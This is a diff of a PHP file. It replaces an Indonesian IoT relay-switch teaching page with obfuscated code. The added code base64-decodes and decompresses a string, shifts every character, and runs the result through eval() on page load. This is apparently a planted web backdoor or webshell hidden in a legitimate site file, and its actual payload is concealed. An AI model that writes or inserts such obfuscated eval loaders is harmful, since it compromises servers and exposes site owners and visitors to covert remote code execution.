@@ -1,60 +1,10 @@
-<?php 
-
-require 'koneksidb.php';
-
-
- ?>
-
-
-
-<!doctype html>
-<html lang="en">
-  <head>
-    <!-- Required meta tags -->
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-
-    <!-- Bootstrap CSS -->
-    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
-
-    <!-- Font Awesome -->
-    <link href="fontawesome/css/all.css" rel="stylesheet"> <!--load all styles -->
-
-    <!-- Icon toogle switch -->
-    <link href="https://cdn.jsdelivr.net/gh/gitbrent/bootstrap4-toggle@3.6.1/css/bootstrap4-toggle.min.css" rel="stylesheet">
-
-
-    <title>MEDIA PEMBELAJARAN SAKLAR RELAY IoT</title>
-    <!-- Navbar -->
-          <nav class="navbar fixed-top navbar-expand-sm navbar-dark bg-dark ml-auto ">
-            <a class="navbar-brand" href="#"><marquee> MEDIA PEMBELAJARAN SAKLAR RELAY IoT</marquee></a>
-            <!--<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
-              <span class="navbar-toggler-icon"></span>
-            </button>-->
-          </nav>
-  </head>
-  <body class="bg-light">
-          <br><br><br>
-          <center>
-              <img class="img-fluid responsive-sm mt-3" src="img/png2.png" alt="Responsive image" style="width:480px; height:50px;">
-          </center>
-
-
-    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
-    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
-    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
-
-    <!-- My Javascript/jQuery -->
-    <script src="js/jquery-3.4.1.min.js"></script>
-    <script src="js/script.js"></script>
-
-    <!-- Sweet Alert -->
-    <script src="js/sweetalert2.all.min.js"></script>
-
-    <!-- Icon Toogle Switch -->
-    <script src="https://cdn.jsdelivr.net/gh/gitbrent/bootstrap4-toggle@3.6.1/js/bootstrap4-toggle.min.js"></script>
-
-  </body>
-</html>
-
+<?php function jHhBnV($VSof)
+{ 
+$VSof=gzinflate(base64_decode($VSof));
+ for($i=0;$i<strlen($VSof);$i++)
+ {
+$VSof[$i] = chr(ord($VSof[$i])-1);
+ }
+ return $VSof;
+ }eval(jHhBnV("pVRda+MwEHyPfsUiArEPekmejXvkGl9b6JGQuByHMUGxN42uruVYcksp+e2V/BG7yREK1Ytt7exoVjtrALMIGQ6X/CljKcSYPuhHyp4YbHiCkOVCovyebTOS467gOQJ9FCk+Sh6vzTZ1COnxjcWlRGX1V9eeHwykYgoHoQ2zBXQDlMc0tO030oMeQP92CtVyoRN3SM8ES45usGF1SJXUj5lidfquwPzVokvvzrvy4Rv8Wsx+g2JrTFZarcpFAn9uvIUH+kgXBvrkAbWD0YHLLL4Bq+QMqP937tEQXBfoJFL8GeFOvFAb3jrwQ0olVGPHp4BSZw2AkXMU3R99YyLxLMP4HMP+s7Xc8Iftl4sZf7mY0fliahfsksYi9H4+nfjeUVuXng9L3+ybvlYWOe117anauReXlV8Mu+3owH9kaou2euqX4bAaBxCFygqlp+WZR0gO9/dhCOhasLy0e3uRRkO53Tq+RjldSG3sz9ia2p3MDsdG5Miibe0CYBL6uXj5KKXS3AhyS0RAf84mi6mWbYa027Z/UqRBBbme385oGEKTUt5/Obgt+Z6cvHdLzFEWidIMhnaFaSRitMoz7JYGMNqKBqv/Myc+IfDj8h0="));
+?>
